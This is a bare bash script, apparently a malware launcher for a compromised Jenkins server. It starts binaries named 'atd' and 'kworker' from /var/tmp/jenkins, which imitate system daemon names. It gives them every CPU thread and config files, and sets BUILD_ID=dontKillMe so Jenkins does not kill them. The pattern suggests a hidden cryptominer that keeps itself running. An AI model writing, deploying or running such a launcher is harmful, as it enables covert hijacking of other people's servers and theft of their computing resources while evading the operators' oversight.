#!/bin/bash
count=$(ps -ef | grep -v grep | grep atd | grep conf| wc -l)
thread=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1)
chmod +x /var/tmp/jenkins/atd && chmod +x /var/tmp/jenkins/kworker
echo $count
if [ $count -lt 1 ]; then
cd /var/tmp/jenkins && BUILD_ID=dontKillMe nohup ./atd -c honvbsasbf.conf -t $thread -B &
fi
doublecount=$(ps -ef | grep -v grep | grep atd | grep conf| wc -l)
if [ $doublecount -lt 1 ]; then
cd /var/tmp/jenkins && BUILD_ID=dontKillMe nohup ./kworker -c config.json -B &
fi
